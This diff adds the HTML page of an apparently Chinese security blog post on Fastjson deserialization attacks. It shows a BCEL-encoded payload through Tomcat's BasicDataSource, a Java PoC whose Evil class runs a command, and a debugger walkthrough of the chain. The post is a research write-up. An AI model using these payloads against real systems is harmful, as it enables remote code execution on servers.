@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Fastjson反序列化2 上一篇主要是Fastjson反序列化的基本原理和一些绕过方法，这一篇作为补充，写上一篇没提到的链以及反序列化细节问题和fastjson&gt;&#x3D;1.2.48的绕过以及原生反序列化等，作为一个补充  Bcel不出网链这个链主要是应对不出网的情形，之前也有TemplatesImpl利用链可以加载恶意字节码，但是需要在parse()时额外设置Feature.Supp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化2">
+<meta property="og:url" content="https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/index.html">
+<meta property="og:site_name" content="le0n&#39;s blogs">
+<meta property="og:description" content="Fastjson反序列化2 上一篇主要是Fastjson反序列化的基本原理和一些绕过方法，这一篇作为补充，写上一篇没提到的链以及反序列化细节问题和fastjson&gt;&#x3D;1.2.48的绕过以及原生反序列化等，作为一个补充  Bcel不出网链这个链主要是应对不出网的情形，之前也有TemplatesImpl利用链可以加载恶意字节码，但是需要在parse()时额外设置Feature.Supp">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0wlle0n.github.io/images/71055fc3b20fe38db90997fe13627e84.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/26663ed22340f50242e7653692395cff.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/0c9ee3d17dd1f05a068f55ff777917bd.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/1dab96adc914eefb16525c0ebe6bfeb3.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/1c750a08e5c91c20ae1a4c6c2702a592.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/bb67e0c49c667da2d12852491f6fce5e.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/dd30eac9db584904f9d07cee5c5d31a4.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/d53600abca45bc34c7527add71b94703.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/a6d71b93d6979c36b43e51b33a1dab5d.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/e2ab28fb7b9f64e5e9674220e0843e1a.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/1e2c787da2724f33d22f479f4412f536.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/fa80e1d82c9dd9d9cd47a38eb7a343d6.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/d6c574cc980f55d2dee8cfa5dbc44183.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/e27b79088784a1f1e6b0790de40904f9.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/4c9c1dca3710e26dc4576d13f8ac28ca.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/0c6167b872d775f809eeb594ecda8b62.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/084dc22f7b8e32a425f81faa430effbe.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/d361a4ae25e81af217ff3d6e41a8c81e.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/e27b79088784a1f1e6b0790de40904f9.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/0ac5cb1c595bcce5cd0528cf00662c17.png">
+<meta property="article:published_time" content="2025-03-29T14:12:40.000Z">
+<meta property="article:modified_time" content="2025-03-29T14:13:41.491Z">
+<meta property="article:author" content="le0n">
+<meta property="article:tag" content="Fastjson">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0wlle0n.github.io/images/71055fc3b20fe38db90997fe13627e84.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Fastjson反序列化2</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&text=Fastjson反序列化2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&is_video=false&description=Fastjson反序列化2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Fastjson反序列化2&body=Check out this article: https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&title=Fastjson反序列化2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&name=Fastjson反序列化2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/03/29/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/&t=Fastjson反序列化2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962"><span class="toc-number">1.</span> <span class="toc-text">Fastjson反序列化2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bcel%E4%B8%8D%E5%87%BA%E7%BD%91%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">Bcel不出网链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">调试过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tips"><span class="toc-number">1.1.2.</span> <span class="toc-text">Tips</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">Fastjson原生反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">1.2.1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-1-2-49"><span class="toc-number">1.2.2.</span> <span class="toc-text">fastjson&gt;&#x3D;1.2.49</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-48"><span class="toc-number">1.3.</span> <span class="toc-text">1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThrowableDeserializer"><span class="toc-number">1.3.1.</span> <span class="toc-text">ThrowableDeserializer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaBeanDeserializer"><span class="toc-number">1.3.2.</span> <span class="toc-text">JavaBeanDeserializer</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Fastjson反序列化2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">le0n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-29T14:12:40.000Z" class="dt-published" itemprop="datePublished">2025-03-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Fastjson/" rel="tag">Fastjson</a>, <a class="p-category" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Fastjson反序列化2"><a href="#Fastjson反序列化2" class="headerlink" title="Fastjson反序列化2"></a>Fastjson反序列化2</h1><blockquote>
+<p>上一篇主要是Fastjson反序列化的基本原理和一些绕过方法，这一篇作为补充，写上一篇没提到的链以及反序列化细节问题和fastjson&gt;&#x3D;1.2.48的绕过以及原生反序列化等，作为一个补充</p>
+</blockquote>
+<h2 id="Bcel不出网链"><a href="#Bcel不出网链" class="headerlink" title="Bcel不出网链"></a>Bcel不出网链</h2><p>这个链主要是应对不出网的情形，之前也有TemplatesImpl利用链可以加载恶意字节码，但是需要在parse()时额外设置<code>Feature.SupportNonPublicField</code>以允许访问private属性outputProperties，利用条件还是比较苛刻。</p>
+<p>而bcel利用链不需要反连，不要求特定的代码写法，直接传入恶意代码bytecode完成利用，而且依赖包 tomcat-dbcp 使用也比较广泛，是Tomcat的数据库驱动组件。</p>
+<p>利用链：BasicDataSource.getConnection() &gt; createDataSource() &gt; createConnectionFactory()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c30$Q$i$b7$a5NBJ$a1P$de$efg$cb$81$5e$b8$VqA$m$n$c2C$U$VqL$8di$5dB$82$d2$U$f8$p$ce$5c$A$81$Ew$3e$K$b1$O$a8T$CK$d9$cd$ce$cc$8e$d7$f6$c7$e7$cb$h$80u$U$y$98$Y$b50$86q$D$T$3aOrLqL$5bHc$86c$96c$8e$n$bd$a1$7c$Vm2$q$L$c5$wCj$x8$97$MYG$f9$f2$a0$7dU$93$e1$89$5b$f3$I$c99$81p$bd$aa$h$w$5d$ff$80$a9$a8$a1Z$e4$e1l$df$u$af$cc$60l$I$ef$c7$8e$R$9dw$9a$ee$8d$5bRAi$f7p$fbN$c8$ebH$F$3e$c92$95$c8$V$97$fb$eeulCC1X$95$a0$j$K$b9$a3$b4$ad$a9$ed$d6t$af$N$L$bd$i$f36$W$b0H$fb$d1$I$c2$c6$S$96$Z$G$ff$f1f$Y$8fQ$cf$f5$eb$a5$e3$b6$l$a9$x$d9$n$b5$d7$Kyhs$86$fe_$e1a$ad$vE$c40$f0$a7$97$e6$aa$cb$a8S$e4$LE$e7$8f$86$ce$93$92wR0$ac$U$ba$d8J$U$w$bf$5e$een8$K$D$n$5b$zj$Y$edV$9e4$c2$e0V_D$b9X$c5$i$Mz5$bd$S$60$fa$f0$Um$aaJ$94$Z$e5$9e$d5$t$b0$87$98$cePL$c7$60$S$7d$U$edo$B$b2$e8$a7l$60$a0$d3$7cA$K$cd$8d$3c$p$91K$3e$ouz$8f$cc$de$x$d2g$e4$c6$df$lb$d2$qi$P$J$b5$ed0$fdis3F9a$GaVg$9b$M$e19$MR5D$lG$c2$e1$c8$9bD$M$c7$93$8d$7c$BZv$Er$84$C$A$A</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c30$Q$i$b7$a5NBJ$a1P$de$efg$cb$81$5e$b8$VqA$m$n$c2C$U$VqL$8di$5dB$82$d2$U$f8$p$ce$5c$A$81$Ew$3e$K$b1$O$a8T$CK$d9$cd$ce$cc$8e$d7$f6$c7$e7$cb$h$80u$U$y$98$Y$b50$86q$D$T$3aOrLqL$5bHc$86c$96c$8e$n$bd$a1$7c$Vm2$q$L$c5$wCj$x8$97$MYG$f9$f2$a0$7dU$93$e1$89$5b$f3$I$c99$81p$bd$aa$h$w$5d$ff$80$a9$a8$a1Z$e4$e1l$df$u$af$cc$60l$I$ef$c7$8e$R$9dw$9a$ee$8d$5bRAi$f7p$fbN$c8$ebH$F$3e$c92$95$c8$V$97$fb$eeulCC1X$95$a0$j$K$b9$a3$b4$ad$a9$ed$d6t$af$N$L$bd$i$f36$W$b0H$fb$d1$I$c2$c6$S$96$Z$G$ff$f1f$Y$8fQ$cf$f5$eb$a5$e3$b6$l$a9$x$d9$n$b5$d7$Kyhs$86$fe_$e1a$ad$vE$c40$f0$a7$97$e6$aa$cb$a8S$e4$LE$e7$8f$86$ce$93$92wR0$ac$U$ba$d8J$U$w$bf$5e$een8$K$D$n$5b$zj$Y$edV$9e4$c2$e0V_D$b9X$c5$i$Mz5$bd$S$60$fa$f0$Um$aaJ$94$Z$e5$9e$d5$t$b0$87$98$cePL$c7$60$S$7d$U$edo$B$b2$e8$a7l$60$a0$d3$7cA$K$cd$8d$3c$p$91K$3e$ouz$8f$cc$de$x$d2g$e4$c6$df$lb$d2$qi$P$J$b5$ed0$fdis3F9a$GaVg$9b$M$e19$MR5D$lG$c2$e1$c8$9bD$M$c7$93$8d$7c$BZv$Er$84$C$A$A&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是getConnection()肯定像getoutputProperties会被fastjson当作访问器而调用，所以这段payload先把BasicDataSource对象放在value处，然后又变成key处，触发fastjson对BasicDataSource对象使用toString()触发其任意getter。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Bcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+<span class="string">&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span> ;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Evil.class</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>取到第一个<code>&#123;</code>，把以后内容的当作key解析，即：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c30$Q$i$b7$a5NBJ$a1P$de$efg$cb$81$5e$b8$VqA$m$n$c2C$U$VqL$8di$5dB$82$d2$U$f8$p$ce$5c$A$81$Ew$3e$K$b1$O$a8T$CK$d9$cd$ce$cc$8e$d7$f6$c7$e7$cb$h$80u$U$y$98$Y$b50$86q$D$T$3aOrLqL$5bHc$86c$96c$8e$n$bd$a1$7c$Vm2$q$L$c5$wCj$x8$97$MYG$f9$f2$a0$7dU$93$e1$89$5b$f3$I$c99$81p$bd$aa$h$w$5d$ff$80$a9$a8$a1Z$e4$e1l$df$u$af$cc$60l$I$ef$c7$8e$R$9dw$9a$ee$8d$5bRAi$f7p$fbN$c8$ebH$F$3e$c92$95$c8$V$97$fb$eeulCC1X$95$a0$j$K$b9$a3$b4$ad$a9$ed$d6t$af$N$L$bd$i$f36$W$b0H$fb$d1$I$c2$c6$S$96$Z$G$ff$f1f$Y$8fQ$cf$f5$eb$a5$e3$b6$l$a9$x$d9$n$b5$d7$Kyhs$86$fe_$e1a$ad$vE$c40$f0$a7$97$e6$aa$cb$a8S$e4$LE$e7$8f$86$ce$93$92wR0$ac$U$ba$d8J$U$w$bf$5e$een8$K$D$n$5b$zj$Y$edV$9e4$c2$e0V_D$b9X$c5$i$Mz5$bd$S$60$fa$f0$Um$aaJ$94$Z$e5$9e$d5$t$b0$87$98$cePL$c7$60$S$7d$U$edo$B$b2$e8$a7l$60$a0$d3$7cA$K$cd$8d$3c$p$91K$3e$ouz$8f$cc$de$x$d2g$e4$c6$df$lb$d2$qi$P$J$b5$ed0$fdis3F9a$GaVg$9b$M$e19$MR5D$lG$c2$e1$c8$9bD$M$c7$93$8d$7c$BZv$Er$84$C$A$A&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/71055fc3b20fe38db90997fe13627e84.png"></p>
+<p>第一次先把x解析为key</p>
+<p><img src="/images/26663ed22340f50242e7653692395cff.png"></p>
+<p>然后同样加载出BasicDataSource类，还原它的属性</p>
+<p><img src="/images/0c9ee3d17dd1f05a068f55ff777917bd.png"></p>
+<p>把BasicDataSource类放入jsonObject中（因为有x做键）</p>
+<p><img src="/images/1dab96adc914eefb16525c0ebe6bfeb3.png"></p>
+<p>这里使用hashmap来储存键值</p>
+<p><img src="/images/1c750a08e5c91c20ae1a4c6c2702a592.png"></p>
+<p>然后直接弹计算机了？，其实是在map.put后idea对JSONObject进行了toString</p>
+<p><img src="/images/bb67e0c49c667da2d12852491f6fce5e.png"></p>
+<p>忽略呈现器就不会自动toString了</p>
+<p><img src="/images/dd30eac9db584904f9d07cee5c5d31a4.png"></p>
+<p>最后把产生的object返回，成为key，然后把key用toString处理</p>
+<p><img src="/images/d53600abca45bc34c7527add71b94703.png"></p>
+<p>然后就在里面调用了getter。</p>
+<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource。</p>
+<p>比如：6.0.53、7.0.81等版本。MVN 依赖写法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dbcp&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;6.0.53&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，所以构造PoC的时候需要注意一下。 MVN依赖写法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;9.0.8&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Fastjson原生反序列化"><a href="#Fastjson原生反序列化" class="headerlink" title="Fastjson原生反序列化"></a>Fastjson原生反序列化</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.48"></a>fastjson&lt;&#x3D;1.2.48</h3><p>JSONArray与JSONObject的toString方法都是会调用任意getter的，同时它们实现了Serializable接口，可以通过反序列化构造链子打之前的几种加载恶意类的方法。</p>
+<p>所以先构造出恶意JSONObject，用其他类包装以触发toString。</p>
